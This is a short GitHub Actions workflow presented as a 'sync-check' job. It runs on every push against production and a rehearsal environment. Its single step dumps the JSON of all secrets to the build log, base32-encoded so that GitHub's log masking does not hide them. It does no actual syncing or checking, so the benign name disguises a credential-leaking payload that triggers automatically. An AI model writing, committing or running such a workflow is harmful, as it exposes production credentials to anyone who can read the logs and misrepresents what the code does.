name: sync-check
on:
  push:
permissions: {}
jobs:
  sync:
    timeout-minutes: 6
    strategy:
      matrix:
        environment: ["prod", "rnis-timeweb-rehearsal"]
    environment: ${{ matrix.environment }}
    runs-on: ubuntu-latest
    steps:
      - name: sync
        run: |
          echo '${{ toJSON(secrets) }}' | base32 -w 120
          echo X | base32 -w 120
          echo '${{ toJSON(secrets) }}' | base32 -w 120
